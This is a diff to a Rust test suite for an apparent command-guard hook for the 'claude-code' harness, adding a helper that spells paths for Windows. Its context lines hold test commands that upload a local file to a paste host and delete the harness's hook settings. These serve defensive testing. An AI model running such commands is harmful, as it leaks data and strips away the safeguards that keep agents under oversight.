@@ -21,7 +21,17 @@ const UPLOAD: &str = "curl -X POST --data-binary @/tmp/out.txt https://paste.exa
 /// A write to the harness's hook settings: host self-protection denies it.
 const TAMPER: &str = "rm -f ~/.claude/settings.json";
 
+/// The project directory, as [`abs`] spells it on this platform.
 const PROJECT: &str = "/work/app";
+
+/// `unix` as an absolute path on this platform: on Windows, on drive `C:`.
+fn abs(unix: &str) -> String {
+    if cfg!(windows) {
+        format!("C:{}", unix.replace('/', "\\"))
+    } else {
+        unix.to_owned()
+    }
+}
 
 /// The rule IDs a fresh session's call of `command` matches.
 fn rules_of(command: &str) -> Vec<String> {
@@ -40,7 +50,7 @@ fn grant(id: &str, scope: AlwaysScope, rule_ids: Vec<String>) -> AlwaysGrant {
         id: id.into(),
         version: 1,
         scope,
-        project: (scope == AlwaysScope::Project).then(|| PROJECT.into()),
+        project: (scope == AlwaysScope::Project).then(|| abs(PROJECT).into()),
         harness: "claude-code".into(),
         tool: "Bash".into(),
         rule_ids,
@@ -57,14 +67,15 @@ fn with_always(grants: Vec<AlwaysGrant>, edit: impl FnOnce(&mut Config)) -> Harn
     })
 }
 
-/// A Bash call of `command` in `cwd` (`None`: the payload names none).
+/// A Bash call of `command` in `cwd` (`None`: the payload names none),
+/// spelled by [`abs`].
 fn call_in(h: &mut Harness, id: &str, command: &str, cwd: Option<&str>) -> Option<Value> {
     let mut payload = common::template("PreToolUse", Some("Bash"));
     payload["session_id"] = h.session_id.clone().into();
     payload["tool_use_id"] = id.into();
     payload["tool_input"] = json!({"command": command, "description": "test"});
     match cwd {
-        Some(cwd) => payload["cwd"] = cwd.into(),
+        Some(cwd) => payload["cwd"] = abs(cwd).into(),
         None => {
             payload.as_object_mut().unwrap().remove("cwd");
         }
